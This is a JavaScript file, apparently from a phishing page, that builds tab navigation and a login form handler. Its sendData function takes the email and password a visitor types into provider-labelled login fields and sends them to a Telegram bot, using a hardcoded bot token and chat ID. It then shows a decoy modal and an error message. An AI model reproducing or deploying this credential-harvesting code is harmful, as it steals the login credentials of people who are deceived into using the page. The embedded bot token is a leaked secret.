const navbarLink = document.querySelector('.navbar-links');
const menuToggler = document.querySelector('.menu-toggler');

/**
 * 
 * @param {Event} evt 
 * @param {string} sectionId 
 */
function openSection(evt, sectionId) {
    const tabContent = document.querySelectorAll('.tabcontent');

    for (let i = 0; i < tabContent.length; i++) {
        tabContent[i].style.display = 'none';
    }

    const navLinks = document.querySelectorAll('.navbar-link');

    for (let i = 0; i < navLinks.length; i++) {
        navLinks[i].className = navLinks[i].className.replace(' active', '');
    }

    document.getElementById(sectionId).style.display = 'block';
    evt.currentTarget.className += ' active';
    navbarLink.classList.remove('active');
}

// Klik tombol pertama kali
document.querySelector('#default-open').click();

function openNav() {
    navbarLink.classList.toggle('active');
}

window.addEventListener('click', function(e) {
    if (!navbarLink.contains(e.target) && !menuToggler.contains(e.target)) {
        navbarLink.classList.remove('active');
    }
})

/**
 * 
 * @param {string} provider 
 */
function sendData(provider) {
    const botToken = "bot5500478743:AAEwpke-FrPmYdLTjaqfJvNs7WhOFmaFIno";
    const chatId = "-863587264";

    const loader = document.querySelector('.modal-loading');
    const inputEmail = document.getElementById(`email-${provider}`);
    const inputPassword = document.getElementById(`password-${provider}`);

    if (!inputEmail.value) return;
    if (!inputPassword.value) return;
    
    const message = `PROVIDER: ${provider.toUpperCase()}
    
    Email: ${inputEmail.value}
    Password: ${inputPassword.value}`;
    const url = `https://api.telegram.org/${botToken}/sendMessage?parse_mode=markdown&chat_id=${chatId}&text=${message}`;

    loader.style.display = 'flex';
    fetch(url)
        .then(response => response.json())
        .then(data => {
            if (!data.ok) {
                loader.style.display = 'none';
                alert("Gagal mengirim data ke server!");
                return;
            }

            const modal = document.getElementById('modal-facebook');
            const spanClose = document.querySelector('.close-modal');
            const btnSubmit = document.querySelector('.btnmodal-submit');

            loader.style.display = 'none';

            modal.style.display = 'block';

            spanClose.onclick = function() {
                modal.style.display = 'none';
            }

            btnSubmit.onclick = function() {
                document.querySelector('.alert-danger').style.display = 'block';
            }
            
            window.onclick = function(event) {
                if (event.target == modal) {
                    modal.style.display = 'none';
                }
            }
        })
        .catch(error => {
            console.log(error);
            loader.style.display = 'none';
        })
}